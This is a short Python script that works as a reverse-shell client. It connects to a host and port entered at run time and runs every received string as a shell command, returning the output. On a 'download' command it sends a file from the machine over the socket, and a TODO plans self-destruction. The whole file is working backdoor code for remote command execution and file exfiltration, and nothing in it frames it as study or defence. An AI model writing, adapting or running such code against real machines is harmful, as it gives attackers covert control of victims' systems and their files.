import os
import socket
import subprocess
import tqdm

s = socket.socket()
host = input(("Host: "))
port = int(input("Port: "))
s.connect((host, port))

SEPARATOR = "<SEPARATOR>"

BYTES = 1000000

while True:
	data = s.recv(BYTES)
	# if first 2 characters are cd, change dir to next characters
	# note the :2 is before and the 3: is after
	if data[:2].decode("utf-8") == "cd":
		os.chdir(data[3:].decode("utf-8"))
	elif data.decode("utf-8") == "download":
		"""file_path = s.recv(BYTES)
		file_path = file_path.decode()
		file = open(file_path, "rb")
		contents = file.read()
		s.send(contents)
		print("File sent succesfully")"""
		filename = "alto-adventure.png"
		filesize = os.path.getsize(filename)
		s.send(f"{filename}{SEPARATOR}{filesize}".encode())
		print("Name: " + filename)
		print("Size: " + str(filesize))
		# start sending the file
		progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
		with open(filename, "rb") as f:
		    for _ in progress:
		        # read the bytes from the file
		        bytes_read = f.read(BYTES)
		        if not bytes_read:
		            # file transmitting is done
		            break
		        # we use sendall to assure transimission in 
		        # busy networks
		        s.sendall(bytes_read)
		        # update the progress bar
		        progress.update(len(bytes_read))

	# this must not be elif so it gets executed and actually sends the output stuff
	if len(data) > 0:
		# process open
		# play around with shell
		cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes, "utf-8")
		s.send(str.encode(output_str + str(os.getcwd()) + ' $ '))

## TODO: Self destruct when closed

# Close the connection

s.close()
